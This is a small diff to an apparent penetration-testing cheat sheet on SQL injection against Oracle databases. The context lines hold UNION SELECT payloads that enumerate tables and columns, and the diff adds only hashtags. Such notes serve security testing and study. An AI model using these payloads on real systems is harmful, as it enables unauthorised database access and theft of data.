@@ -11,3 +11,6 @@
 - List Tables: `' UNION SELECT table_name, NULL FROM all_tables--`
 - List Columns: `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_ABC'--`
 - Note: Oracle table/column names are usually UPPERCASE.
+
+
+`#CyberSecurity` `#PenetrationTesting` `#SQLi` `#BurpSuite` `#EthicalHacking`
